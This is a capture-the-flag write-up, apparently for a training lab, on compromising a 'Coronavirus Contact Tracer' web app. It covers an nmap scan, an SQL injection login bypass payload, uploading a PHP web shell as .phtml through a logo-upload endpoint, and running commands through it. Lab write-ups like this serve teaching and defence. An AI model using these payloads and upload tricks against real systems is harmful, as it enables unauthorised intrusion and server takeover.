/ 01

Reconnaissance

1.1 Port Scanning

nmap -sC -sV -p 22,80 10.48.190.0

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Coronavirus Contact Tracer

The target runs an Ubuntu server with SSH and a web application called "Coronavirus Contact Tracer".

/ 02

Initial Access - SQL Injection

2.1 Admin Login Bypass

The admin login page at /admin/login.php was vulnerable to SQL injection:

Username: admin' -- -
Password: anything
Vulnerability: The application concatenates user input directly into SQL queries without sanitization. The payload admin' -- - comments out the password check.
/ 03

Enumeration

3.1 Admin Panel Features

  • Individuals List - Add/edit people with photo upload
  • Establishment List - Manage locations
  • System Info - Update system logo
  • User Profile - Update admin avatar

3.2 File Upload Attempts

Multiple upload points were tested for PHP shell upload:

Upload PointResult
System LogoReturns 200 OK, file saved as uploads/TIMESTAMP_filename
Individual PhotoReturns 500 Error (PHP execution attempted)
User AvatarUpdates database but doesn't save file
/ 04

Exploitation

4.1 Uploading a PHP Shell

# Create PHP shell
echo '' > shell.php

# Upload via System Settings endpoint
curl -X POST http://contacttracer.thm/classes/SystemSettings.php?f=update_settings \
  -H "Cookie: PHPSESSID=[SESSION]" \
  -F "img=@shell.php;filename=shell.phtml"

4.2 Locating the Uploaded Shell

The uploaded file is accessible via the lockscreen page source:

curl http://contacttracer.thm/ | grep "uploads/"

4.3 Command Execution

curl "http://contacttracer.thm/uploads/[TIMESTAMP]_shell.phtml?cmd=whoami"
www-data

/ 06

Key Takeaways

  • SQL injection remains a critical vulnerability - A simple ' -- - bypassed authentication entirely.
  • Multiple upload points have different restrictions - The logo upload was less restrictive than the individual photo upload.
  • Check page source for hidden paths - The uploaded shell filename was visible in the lockscreen HTML.
  • PHP execution depends on directory - /uploads/ didn't execute .php but .phtml worked.
